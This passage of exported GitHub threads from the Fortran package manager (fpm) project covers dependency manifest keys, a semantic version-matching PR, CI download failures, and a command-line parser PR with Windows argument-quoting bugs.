                    "text": "Apologies, yes I forgot to say that f-fpm also does not yet create static libraries libName.a as you point out.\n\n... it worked very well on 17 non-trival projects ...\n\nI'm glad to hear this!\n\nIs supporting two languages why the .f90 suffix is left on the relocatable files?\n\nYes, although we really only need to leave the suffix on non-fortran files, so it is still possible to have full compatibility with h-fpm in the intermediate files if desired.\n\n... if you could take a look at the M_msg module which is the smallest example hitting the problem that would be great.\n\nI've looked into this and opened an issue (urbanjost/M_msg#1). In summary, the difference in behaviour with h-fpm is because f-fpm does not yet support linking with static libraries."
                }
            ]
        },
        {
            "number": 187,
            "user": "urbanjost",
            "date": "2020-09-22 00:30:58+00:00",
            "title": "Fortran fpm(1) does not take ver= keyword on dependencies",
            "text": "In the Fortran version if you use ver= with a dependency it fails\n[dependencies.M_CLI2]\ngit = \"https://github.com/urbanjost/M_CLI2.git\"\nver = \"a177b0077819571815fa6a8da6980bcb45443858\"\nfpm run --args build\nKey ver is not allowed in dependency M_CLI2\nERROR STOP 1\nError termination. Backtrace:\n#0  0x7fc87742e131 in ???\n#1  0x7fc87742ecd9 in ???\n#2  0x7fc87742fe9b in ???\n#3  0x404570 in fpm_MOD_cmd_build\nat src/fpm.f90:101\n#4  0x401977 in MAIN\nat app/main.f90:22\n#5  0x401a20 in main\nat app/main.f90:8",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 06:05:47+00:00",
                    "text": "For reference, the bootstrap fpm will only use rev, branch or tag for git dependencies.\n\n  \n    \n      fpm/PACKAGING.md\n    \n    \n        Lines 647 to 657\n      in\n      1a394d7\n    \n    \n    \n    \n\n        \n          \n           You can also be specific about which version of a dependency you\u2019d like. You can \n        \n\n        \n          \n           specify a branch to use like \n        \n\n        \n          \n           `helloff = { git = \"https://gitlab.com/everythingfunctional/helloff.git\", branch = \"master\" }`, \n        \n\n        \n          \n           or a tag like \n        \n\n        \n          \n           `helloff = { git = \"https://gitlab.com/everythingfunctional/helloff.git\", tag = \"v1.2.3\" }`, \n        \n\n        \n          \n           or even a specific commit like \n        \n\n        \n          \n           `helloff = { git = \"https://gitlab.com/everythingfunctional/helloff.git\", rev = \"a1b2c3\" }`. \n        \n\n        \n          \n           You can even specify the path to another folder, if for example you\u2019ve got \n        \n\n        \n          \n           another fpm package in the same repository. Like this: \n        \n\n        \n          \n           `helloff = { path = \"helloff\" }`. Note that you should *not* specify paths \n        \n\n        \n          \n           outside of your repository, or things won\u2019t work for your users. \n        \n    \n  \n\n\nEverything else can be specified, but is silently ignored in bootstrap fpm."
                }
            ]
        },
        {
            "number": 186,
            "user": "awvwgk",
            "date": "2020-09-21 21:46:20+00:00",
            "title": "Implement version string validation and comparison",
            "text": "This is probably not immediately useful, therefore I'm opening it as draft for discussion.\nThis PR implements a version type, somewhat similar to Python's StrictVersion, which allows parsing version numbers and comparing them, if they follow a strict format. Version numbers can become complicated, the most involved versioning scheme I have seen so far is the Arch Linux PKGBUILD version, featuring a version epoch, a version number (probably semantic, but not necessarily) and a build number: [<int>:]<int>[.<int>...]-<int>.\nHere support for a version of the form of <int>[.<int>...] is implemented, where the number of subversions is limited to an arbitrarily chosen 10 (probably way too much) 3 (for semantic versioning <major>[.<minor>[.<patch>]]). Have a look at the tests to see what is possible.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 00:24:40+00:00",
                    "text": "I'm a big fan of semantic versioning. This means 3 parts to a version number, <major>.<minor>.<patch>. I think we should at least strongly encourage this for any published fpm packages.\nThe requirements are basically:\n\nAny additions to public interfaces require a minor version bump\nAny backward incompatible change requires a major version bump\n\nIf semantic versioning is followed, users know that patch and minor version updates are safe (won't break anything), and major version upgrades may require some rework."
                },
                {
                    "user": "certik",
                    "date": "2020-09-22 02:12:11+00:00",
                    "text": "You can probably already guess my opinion: I suggest we require semantic versioning, just like Cargo."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 06:24:10+00:00",
                    "text": "I'm all for encouraging semantic versioning. It won't hurt to give fpm at least the ability to make sense from version numbers not strictly following this scheme to make it a more robust.\nA good example is the conda-forge-pinning feedstock, not because it uses a timestamp as version, but because it has a long list of important packages not following semantic versioning."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-22 07:24:47+00:00",
                    "text": "This looks good @awvwgk. I agree that understanding versions will be important in fpm for dependencies.\nI agree with everything that @everythingfunctional has said; semantic versioning is easy and intuitive to understand.\nSince we're starting from scratch here, I also think it makes sense to stick to one version format for all packages - unless there are advantages/requirements for other formats?\nHowever many user packages won't be destined for publishing so I don't think fpm should require a version string for packages or attempt to enforce the rules of semantic versioning beyond the format of the field.\nEnforcement of semantic versioning rules should happen at package registry level (fpm-registry) with fpm simply having helper options to automatically set and bump the version as is required. fpm-registry already requires a version field to be present in package manifests during its CI checks. On PR, fpm-registry can check interfaces against any prior registry versions and throw an error if the rules aren't met. I don't believe this will be difficult to implement in our current checks."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 09:40:03+00:00",
                    "text": "Semantic versioning is fine, up to the point where the developer applying it fails to follow its convention, on purpose or by accident. Also, API breakage is not always a good measure for versioning, not every compatibility breakage is defined by an API or ABI change.\nI'm not advocating against semantic versioning. Just keep in mind that versioning can be complicated and even requiring semantic versioning might not be enough. It would be thoughtful of fpm to allow for some flexibility in this regard, even if it is just to make an already painful job of sorting out dependency versions not more painful."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 15:43:00+00:00",
                    "text": "I very much agree with what @LKedward said. True, semantic versioning isn't bullet proof - despite our best efforts, users can (intentionally or not) end up depending on internal implementation details - but it's still helpful and worth utilizing.\nI could envision allowing some additional info in the version string, but it would not be used for ordering of versions, and for any packages that supply it, that would be a necessary piece for the users of the library to include when specifying a version. The most obvious use case that comes to mind would be different versions for different operating systems, and still allow users use wildcard version specification (i.e. some_lib = '2.*-linux') would match the latest version 2.0 <= x < 3.0 that ends in -linux. Thus, a version string would have the format <major>.<minor>.<patch>[-whatever_you_want] where semantic versioning is still implied between versions with matching -whatever_you_want and there is no ordering implied between different optional endings. Seem reasonable?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 17:35:23+00:00",
                    "text": "Maybe this is just some misunderstanding. Would this mean the version string must match the regex \\d+\\.\\d+\\.\\d+?\n\nThe most obvious use case that comes to mind would be different versions for different operating systems, and still allow users use wildcard version specification (i.e. some_lib = '2.*-linux') would match the latest version 2.0 <= x < 3.0 that ends in -linux.\n\nSorry for derailing this conversation, the better solution than mangling this into the version string would be allowing the registry to specify variants and fpm use them with\nsome_lib.version = \"2\"\nsome_lib.variant = \"linux\""
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 18:09:34+00:00",
                    "text": "I think we could allow the absence of the minor or patch versions to simply imply that they are zero.\nThe variant route might be an interesting approach instead of complicating the version."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 18:44:56+00:00",
                    "text": "I set the maximum subversion limit to three, resulting effectively in \u201csemantic versioning,\u201d with optional minor and patch version.\nAlso implemented a \u201csemantic version\u201d matching for the version date type as well, while trying to keep it as flexible as possible.\nThe match operator between two versions would work like this:\nsome_dep1 = \"2\"  # >=2 and <3\nsome_dep2 = \"0.7\" # >=0.7 and <0.8\nsome_dep3 = \"1.3\" # >=1.3 and <1.4\nsome_dep4 = \"1.0.7\" # >=1.0.7 and <1.0.8 <=> ==1.0.7\n# to discuss: version numbers ending on zero\nsome_dep5 = \"2.0\" # currently >=2 and <3, not >=2.1 and <3.1\nThis might not be the best choice to determine the version number to match against:\n\n  \n    \n      fpm/fpm/src/fpm/versioning.f90\n    \n    \n        Lines 366 to 371\n      in\n      5191bef\n    \n    \n    \n    \n\n        \n          \n           do ii = size(rhs%num), 1, -1 \n        \n\n        \n          \n               if (rhs%num(ii) /= 0) then \n        \n\n        \n          \n                   tmp%num = rhs%num(:ii) \n        \n\n        \n          \n                   exit \n        \n\n        \n          \n               end if \n        \n\n        \n          \n           end do \n        \n    \n  \n\n\nProbably, we should not compare against a version data type at all, but have a separate version-constraint data type for this purpose."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-23 06:30:10+00:00",
                    "text": "I do not understand the second part of the explanation:\n\n    some_dep5 = \"2.0\" # currently >= 2 and < 3, not >= 2.1 and < 3\n\nthat is: >= 2.1. But apart from that, I would say that \"2.0\" should be\ninterpreted as >= 2.0.x and < 2.1.\n\n\nOp di 22 sep. 2020 om 20:45 schreef Sebastian Ehlert <\nnotifications@github.com>:\n\u2026\n I set the maximum subversion limit to three, resulting effectively in\n semantic versioning, with optional minor and patch version.\n Also implemented a \u201csemantic version\u201d matching for the version date type\n as well, while trying to keep it as flexible as possible.\n\n The match operator between two versions would work like this:\n\n some_dep1 = \"2\"  # >=2 and <3\n some_dep2 = \"0.7\" # >=0.7 and <0.8\n some_dep3 = \"1.3\" # >=1.3 and <1.4\n some_dep4 = \"1.0.7\" # >=1.0.7 and <1.0.8 <=> ==1.0.7\n # to discuss: version numbers ending on zero\n some_dep5 = \"2.0\" # currently >= 2 and < 3, not >= 2.1 and < 3\n\n This might not be the best choice to determine the version number to match\n against:\n\n https://github.com/fortran-lang/fpm/blob/5191befcc8a2c6dd67f0e0ab819b82fa68f39348/fpm/src/fpm/versioning.f90#L366-L371\n\n Probably, we should not compare against a version data type at all, but\n have a separate version-constraint data type for this purpose.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#186 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR3CKLRALOI5CGCYZP3SHDWDRANCNFSM4RVA5MLQ>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-23 08:52:48+00:00",
                    "text": "Agreed, I'm just using the number of subversions to create the matching now."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-23 14:28:02+00:00",
                    "text": "I believe most package managers use a different type for the package version versus the specified version of a dependency. They then use some sort of constraint solver for selecting the appropriate version from the repository/registry.\nI agree with @arjenmarkus that most users would probably expect some_dep = \"2.0\" to mean >= 2.0.0 and < 2.1.0, whereas some_dep = \"2\" would mean >=2.0.0 and <3.0.0."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 19:29:56+00:00",
                    "text": "Thanks for the input and discussion so far. I guess I will just mark it as ready for review now.\nThe .match. operator should now work as expected without surprises:\nsome_dep1 = \"2\"  # >=2 and <3\nsome_dep2 = \"0.7\" # >=0.7 and <0.8\nsome_dep3 = \"1.3\" # >=1.3 and <1.4\nsome_dep4 = \"1.0.7\" # >=1.0.7 and <1.0.8 <=> ==1.0.7\nsome_dep5 = \"2.0\" # >=2.0 and <2.1\nAll comparison operators are implemented as elemental, so they should play nicely together with array operations and any or all reductions."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 20:20:42+00:00",
                    "text": "Didn't check the code for it, but I think your example\nsome_dep5 = \"2.0\" # >=2.1 and <3.1\n\nshould be\nsome_dep5 = \"2.0\" # >=2.0 and <2.1"
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:18:17+00:00",
                    "text": "@awvwgk, can you please address @everythingfunctional's question, and then resolve conflicts? After that this is ready to merge."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-28 15:34:28+00:00",
                    "text": "Rebased against 90ddc6f"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-29 14:31:52+00:00",
                    "text": "@awvwgk Please merge when ready."
                }
            ]
        },
        {
            "number": 185,
            "user": "LKedward",
            "date": "2020-09-21 19:01:22+00:00",
            "title": "Update: CI workflow",
            "text": "Download stack from github releases page.\nIt turns out that all three OSes on github actions have the latest release (2.3.3) of stack already installed. (See here).\nSo I've simply removed the installation steps.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-21 19:25:56+00:00",
                    "text": "That works. If it breaks we'll fix it later. +1 to meege.\n\u2026\nOn Mon, Sep 21, 2020, at 1:23 PM, Laurence Kedward wrote:\n\n\n @LKedward <https://github.com/LKedward> requested your review on: #185\n <#185> Update: CI workflow.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#185 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWESE6DATSUW2O64TDLSG6R2RANCNFSM4RU4FWJA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:57:47+00:00",
                    "text": "That's super convenient. :)"
                }
            ]
        },
        {
            "number": 184,
            "user": "certik",
            "date": "2020-09-21 15:10:55+00:00",
            "title": "Build failing due to SSL error at get.haskellstack.org",
            "text": "This URL fails to download (even in a browser for me right now) due to some SSL error:\nhttps://get.haskellstack.org/stable/windows-x86_64.zip\nAnd so our CI tests currently fail.\n@everythingfunctional what do you think we should do?\nWe can host the Haskell binaries ourselves for our CI tests.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-21 15:17:33+00:00",
                    "text": "We can host the Haskell binaries ourselves for our CI tests.\n\nThis makes sense; we already do this for the OSX binary right?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 16:25:54+00:00",
                    "text": "That's right, I forgot about that!\nI won't have time to work on this, but if anyone can upload the Windows and Linux binaries somewhere, so that we can change the links, that would be awesome."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 16:36:34+00:00",
                    "text": "Happy to do it! I just need to find another place to download them from other than haskellstack.org..."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 16:45:18+00:00",
                    "text": "@LKedward thank you, that would be a huge help!"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 16:45:25+00:00",
                    "text": "I've found binaries on the stack github page:\nhttps://github.com/commercialhaskell/stack/releases/tag/v2.3.3\nI could just replace the download links in the CI workflow file with these? Or would you prefer if we hosted them ourselves?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 16:46:54+00:00",
                    "text": "Let's just replace them for now. I think the GitHub links should be stable."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 18:38:06+00:00",
                    "text": "It looks like haskellstack.org now working again, and the main CI is now passing but I will still open a pull request to replace the stack urls with those from git."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:06:03+00:00",
                    "text": "I think there's an aspect of having one more thing to maintain if we have our own \"mirror\" for the stack binaries, and I don't know if I'd ever expect to have this problem again. You can do it if you want, but I don't know that it's necessary. Whatever you guys think."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 20:28:47+00:00",
                    "text": "Well, I had to upload the macOS binary in the past precisely for this problem. So this is the second time happening, so unfortunately I expect it to happen again.\nThis issue has been fixed by #185."
                }
            ]
        },
        {
            "number": 183,
            "user": "urbanjost",
            "date": "2020-09-21 00:24:36+00:00",
            "title": "haskel version takes commit= keyword on a dependency,  the Fortran prototype does not",
            "text": "Given a dependency with a specific git(1) commit value\n[dependencies.M_CLI2]\ngit = \"https://github.com/urbanjost/M_CLI2.git\"\ncommit = \"a177b0077819571815fa6a8da6980bcb45443858\"\nThe Fortran fpm(1) prototype complains about the commit keyword\nfpm run --args build\nKey commit is not allowed in dependency M_CLI2\nERROR STOP 1\nError termination. Backtrace:\n#0  0x7f9497368131 in ???\n#1  0x7f9497368cd9 in ???\n#2  0x7f9497369e9b in ???\n#3  0x404570 in fpm_MOD_cmd_build\nat src/fpm.f90:101\n#4  0x401977 in MAIN\nat app/main.f90:22\n#5  0x401a20 in main\nat app/main.f90:8\nbut it builds OK with the haskell version\n[urbanjs@localhost fpm]$ fpm build\n[urbanjs@localhost fpm]$\nIt looks like the commit= keyword was not enabled?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-21 05:58:24+00:00",
                    "text": "Apologies, I was mistaken in my suggestion for #181; the correct syntax for specifying a commit is rev=. This is for both versions of fpm.\nHaskell fpm does not verify the manifest file and so won't complain about commit being incorrect."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-21 23:52:10+00:00",
                    "text": "Well, the good and the bad about a full verification. In this case good."
                }
            ]
        },
        {
            "number": 182,
            "user": "urbanjost",
            "date": "2020-09-20 19:51:46+00:00",
            "title": "CLI interface to further development of subcommands",
            "text": "CLI interface to further development of subcommands\npass settings\nextended help for each subcommand\nchange commit= to ver= in fpm.toml\nver= does not work either\nno specific version as ver= does not work for M_CLI2\nadd test program for CLI\nfix fpm.toml version reference\nremove --usage references from help text\ncomment and clarify CLI unit test\nbasic RUN subcommand\nrestore fpm_command_line.f90 changes\nremove non-zero STOP for no parameters for testing\nspelling error in help\nuse basename to make sure name is a simple name\nremove dash from executable name to see if it clears MSWindows build error\ntry one more like previous build to clear error\none more time like previous version to see if build error clears on MSWindows\ndebug run to see PC variables\nmake quoting of -- ARGS values less platform dependent and change test accordingly\nchange .gitignore\nRESTORE\nRESTORE FROM BACKUP",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-09-20 20:02:40+00:00",
                    "text": "This should implement the CLI; with the only reference to which parser (M_CLI2)  used is isolated to the fpm_command_line.f90 file.  I ran into what I think is a bug with allocatable character variables of allocatable length but I believe just fixing the length to 4096 resolves that with gfortran, and implements parsing equivalent to all the parameters of the Haskell fpm(1). It should be easy to switch to an alternate parser by changing only fpm_command_line.f90\nI ran into a problem with what appears to be the Fortran TOML interface not recognizing commit= on a dependency as well, which I think shoud be changed in the TOML interface?\nWith this in place it would be a lot easier to move forward on new,run,test for at least a simple module with no dependencies although the \"libcurl\" and \"libgit\" and \"os_system\" interfaces are more significant it is hard to try things out without the CLI interface."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 15:14:55+00:00",
                    "text": "Thanks!\nThe CI tests fail due to #184. We need to fix that."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:41:20+00:00",
                    "text": "I'm still a bit unclear on how exactly to use M_CLI2 (let alone how it works), and it kind of looks like the subcommand aspect isn't a very natural fit (that part is done without the use of M_CLI2).\nBut, since it's working, and is very well isolated from the rest of the code (which is what I was aiming for no matter what solution we used), I'm happy with it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:58:43+00:00",
                    "text": "Does this just need to be rebased after #185 to fix the CI? I think that's what it looks like."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-22 13:13:49+00:00",
                    "text": "OK. Make change to fpm.toml file and added a test of the CLI interface, which gets a little complicated if you want it to actually call a process; so it uses NAMELIST groups to write information from the subprocess back to the original test process but  if you get past the NAMELIST usage it should be a thorough test.\nM_CLI2 is designed with  a more functional/procedural approach.  The documentation on the web site or included in the manpages that come with and around 10 tests on the README hopefully give an idea of how it is more typically used; I tend to go procedural until I have a reason not too so I had a bit of a time figuring out how to best fit it into the model. Never used an ABSTRACT type before, for example. It is totally isolated and in a single module as you said, so it gets things going and should be easy to change out if anyone wants to. Parts of M_CLI2 have been modernized but it was originally written before F90 existed so it might look odd to someone approaching things from an OOP stance. The biggest oddity is a rather primitive dictionary so it could be split out to be stand-alone and the original dictionary code was overkill for just command parsing."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-22 13:34:54+00:00",
                    "text": "We need to update the CI scripts to fix the CI checks:\n\nadd --args \"--version\" to the fpm run command\nremove the redundant call to execute build/gfortran_debug/app/fpm\n\nFor ci/run_tests.sh:\ndiff --git a/ci/run_tests.sh b/ci/run_tests.sh\nindex 418fcf2..5e29fa1 100755\n--- a/ci/run_tests.sh\n+++ b/ci/run_tests.sh\n@@ -4,9 +4,8 @@ set -ex\n\n cd fpm\n fpm build\n-fpm run\n+fpm run --args \"--version\"\n fpm test\n-build/gfortran_debug/app/fpm\n\nand similarly for ci/run_tests.bat:\ndiff --git a/ci/run_tests.bat b/ci/run_tests.bat\nindex 92b3cd6..6d4846f 100755\n--- a/ci/run_tests.bat\n+++ b/ci/run_tests.bat\n@@ -6,15 +6,12 @@ if errorlevel 1 exit 1\n fpm build\n if errorlevel 1 exit 1\n \n-fpm run\n+fpm run --args \"--version\"\n if errorlevel 1 exit 1\n \n fpm test\n if errorlevel 1 exit 1\n \n-build\\gfortran_debug\\app\\fpm\n-if errorlevel 1 exit 1\n-\n cd ..\\test\\example_packages\\hello_world\n if errorlevel 1 exit 1"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 16:24:09+00:00",
                    "text": "Thank you for adding the tests. Although I still find it quite hard to follow, what with calling itself recursively and using a file to pass data back. It's hard to see how the given command line corresponds to the expected settings object, or what the expected error is."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-23 22:55:49+00:00",
                    "text": "firefox cannot look at the failure; it displays everything off-screen on my machine; and a tool for doing pull requests is not doing what the documentation indicates it should so I cannot view this to confirm it. On my machines everything works fine. I have some simpler changes to suggest for run, test, and new that I would like to add but they depend on a functioning CLI.  Any help on reviewing this so it can be included or deleted would be appreciated, but at least on my machine I can create a new repository, build, test and run it as long as it is as simple as when the new subcommand produces (no recursive build and build always builds, but actually at least partially functional; but it runs and tests all 22 of the test cases I have so I am looking forward to being able to contribute this so the bigger hurdles of downloading and building complex cases (building only what needs rebuilt) have a full foundation to be tested with."
                },
                {
                    "user": "certik",
                    "date": "2020-09-23 23:07:09+00:00",
                    "text": "The Windows error is:\n2020-09-23T13:23:55.0047154Z # gfortran (for build/gfortran_debug/app/main.o)\n2020-09-23T13:23:55.1149736Z # gfortran (for build/gfortran_debug/app/fpm.exe)\n2020-09-23T13:23:55.4213275Z fpm: Error when running Shake build system:\n2020-09-23T13:23:55.4214301Z   at want, called at src\\Build.hs:114:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4215120Z * Depends on: build/gfortran_debug/test/main/fpm-test.exe\n2020-09-23T13:23:55.4216177Z   at need, called at src\\Build.hs:120:13 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4217038Z * Depends on: build/gfortran_debug/test/main/test_manifest.o\n2020-09-23T13:23:55.4217930Z   at &%>, called at src\\Build.hs:137:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4220034Z * Depends on: build/gfortran_debug/test/main/test_manifest.o build/gfortran_debug/test/main/test_manifest.mod\n2020-09-23T13:23:55.4221105Z   at undefined, called at src\\Build.hs:142:25 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4221924Z   at error, called at libraries\\base\\GHC\\Err.hs:78:14 in base:GHC.Err\n2020-09-23T13:23:55.4222481Z * Raised the exception:\n2020-09-23T13:23:55.4222946Z Prelude.undefined\n\nWhich seems like a bug in our Haskell fpm? @everythingfunctional do you know what the issue is?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 00:52:02+00:00",
                    "text": "Thanks. Cannot think of anything different that would trigger that that was not in one that passed. making some trivial changes to see if a new pull request refreshes something"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 13:46:10+00:00",
                    "text": "A test of a command line parser that does not actually use the command line interface would be incomplete. I could just call the CLI parser directly but that would not check the use of the intrinsics for getting the command line arguments which can be quite different even in a single programming environment. So I think it is a much better test to actually call a program to test a program command line parser but I could be argued out of that.\nIf this is going to\nwork I doubt any single person will understand all the parts without this becoming a single-man project!!  I found the basic layout quite alien at first myself; you have to get out of your comfort zone on collaborative stuff has been my experience; so if anyone has any specific questions about the test I would be glad to answer them or add comments to the test or change the test. It is not so much complicated as uncommon to use Fortran as a shell language; but I use Fortran that way all the time so it of course seems more intuitive. Just think of the calling program as being a shell language being used to call another program that just echoes its parameters out for you to read and verify. That makes it non-recursive. Now, one of the easiest file formats to write group of values out with is NAMELIST, where it takes one line to read and write the whole group, so the test program writes out what was passed to it as a NAMELIST file. That could be anything --- JSON, TOML, etc. but those are not built in to Fortran.\nSo now the \"shell\" (the parent call to the program) just calls the program a bunch of times with different parameters and checks what the program sees after being passed through the system. If the values match it is doing what is expected. That allows you to check every major combination of the parameters the fpm program has virtually directly in about 100 lines so I stand by the approach even though I know it is different.\nI would find fpm unuseable if it can only handle one test file. I have projects that require hundreds, especially ones that have many modules in them so I hope that is not a limitation."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-24 14:48:49+00:00",
                    "text": "A test of a command line parser that does not actually use the command line interface would be incomplete. I could just call the CLI parser directly but that would not check the use of the intrinsics for getting the command line arguments which can be quite different even in a single programming environment.\n\nThis is a fair point however one of the advantages of separating functionality into packages is that testing can be separated along the same lines. For example M_CLI2 is responsible for defining an abstraction that interfaces with get_command_argument intrinsics etc.; therefore testing at this level should occur within the M_CLI2 package (I assume it already does) and packages using M_CLI2 need only test what they implement atop M_CLI2. This ideally takes the form of 'short-circuiting' the get_command_argument intrinsic.\nI don't really object to the recursive execution with namelist file, this is a neat end-to-end testing solution; my comment was referring to why this couldn't be implemented within the existing test framework like test_manifest.f90, test_toml.f90 and test_source_parsing.f90. I believe it is possible, but with some complication regarding where the existing parse() method will go. The existing test framework nicely defines test suites with self-contained tests that are easy to interpret.\n\nI would find fpm unuseable if it can only handle one test file. I have projects that require hundreds, especially ones that have many modules in them so I hope that is not a limitation.\n\nThis is not the intended behaviour for fpm as has been discussed in #164. This may be a bug or unimplemented feature in bootstrap fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 16:07:55+00:00",
                    "text": "The bootstrap fpm should support multiple test executables, I have multiple in order to test the IO parts of iso_varying_string. I'll see if I can spare some time today to look more closely at the failure. It seems it must be something Windows specific, since the other OS's are passing."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 17:28:24+00:00",
                    "text": "As I suspected, Windows paths were mucking things up again. I fixed that, and now it looks like there are legitimately a couple failing tests in the CLI on Windows."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 17:39:20+00:00",
                    "text": "It looks like something having to do with the way Windows deals with spaces in command line arguments being ... problematic. I think you have to use double quotes (IIRC).\nSee this question I once asked on Stack Overflow for some additional background and to start you down the rabbit hole: https://stackoverflow.com/questions/43813677/escaping-spaces-in-windows"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 19:01:24+00:00",
                    "text": "It looks like you clobbered my build fix. Would you like me to re-push it?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 19:20:22+00:00",
                    "text": "Seems like it is having trouble with the Shake system again.  I can remove the test and put the files back in the top directory as I think the problem in test17 is likely due with the way quoting is done on MSWindows or arguments are passed to an executable and unfortunately I do not have a programming environment on an MSWindows machine; I have access to a CygWin environment but it ran there.  Using a PR to debug is a bit tough, especially as the most I can get to display in Firefox on Redhat is three lines at a time of the log file.  This is getting too slow to proceed at this point. Disappointing, as I think we are well within the reach of having a functional Fortran fpm sans the network-related functionality."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 19:25:38+00:00",
                    "text": "Did not see the comment. Yes, I did not release pushing out another version would clobber your changes. Not sure what I do to avoid that as I thought your change was independent of this PR. I am quite curious what a debug run with the changes I just added would show, as not that familiar with MSWindows as a programming platform. This is the kind of stuff the test was intended to find, even if I did not expect any (M_CLI2 is a subset of code that has been used for years in hundreds of codes on many Unix and Linux systems. That is why you test I guess :>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 19:47:40+00:00",
                    "text": "A force push generally means you're about to clobber something. In the case that someone has made changes on the branch, general practice is to do git pull --rebase before git push. I'll get it back."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 19:54:00+00:00",
                    "text": "Read the stack overflow descriptions. I think the headache will pass; but I might have to tweek M_CLI2 to detect the OS; just having trouble figuring out how it will work in Powershell versus MSWindows CLI mode versus called from a .bat file, etc. Thanks for the link. It would have been particularly confusing without knowing MSWindows was confused in the first place."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 20:16:36+00:00",
                    "text": "No problem. We're super close."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 00:58:36+00:00",
                    "text": "I have been using a line-mode command called git-pull-request that a friend swears by, and the --force appears to be built in so I need to figure out how to do this manually;  the MSWindows quoting issue is bizarre. I may have to build a programming environment on an MSWindows machine to see if I can sort it out. I got diffferent issues with quoting using simple scripts in PowerShell and a cmd window with a .bat file and from calling a program I built in Cygwin from a cmd window (works fine in CygWin window). And having problems with the website from my browser. It looks like test15 worked which if the code I think is pushed there is there should be having the same issue. Really hard to look at. That is an outlier case I would like to just comment out and solve as a seperate issue. Wondering if the PC version of the Haskell version has any issues with arguments with spaces in an --args option and if not that might be a good clue. Can you just comment those tests out for now if that is simple? I would really like to get this moving and work on the changes in the \"NEW\" PR and get a basic functioning fortran version for simple local cases available and have something I think everyone case work with in that \"NEW\" PR."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 01:12:16+00:00",
                    "text": "Ok, that should fix it. I'm good with going ahead and merging this and opening an issue to deal with the Windows side later. I'll give everybody else a day to veto that before actually doing so though."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 02:04:34+00:00",
                    "text": "Great. Thanks!"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 06:27:30+00:00",
                    "text": "Sorry, late to the party. I might be able to give a hint on the Windows issue. You can't escape using single quotes on the command line on Windows. Both failing tests, 13 and 17 are escaping their whitespace with single quotation marks / apostrophes, if I'm not mistaken."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 07:33:47+00:00",
